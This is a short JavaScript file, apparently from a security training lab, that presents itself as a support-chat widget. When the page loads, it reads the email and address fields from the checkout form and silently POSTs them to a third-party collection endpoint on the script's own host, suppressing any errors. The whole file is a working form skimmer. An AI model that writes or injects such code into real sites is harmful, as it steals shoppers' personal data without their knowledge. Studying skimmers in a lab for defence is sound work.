/* global document, URL, fetch */
;(() => {
  const script = document.currentScript
  const root = document.querySelector('#support-chat-root')
  // Не выполняем устаревший запуск после сброса учебного стенда.
  if (!root || root.dataset.run !== script.dataset.run) return

  const form = document.querySelector('#checkout-form')
  const data = {
    email: form.elements.namedItem('email').value,
    address: form.elements.namedItem('address').value,
  }
  fetch(new URL('/third-party/collect', script.src), {
    method: 'POST',
    credentials: 'omit',
    body: JSON.stringify({ run: script.dataset.run, data }),
  }).catch(() => {})
})()
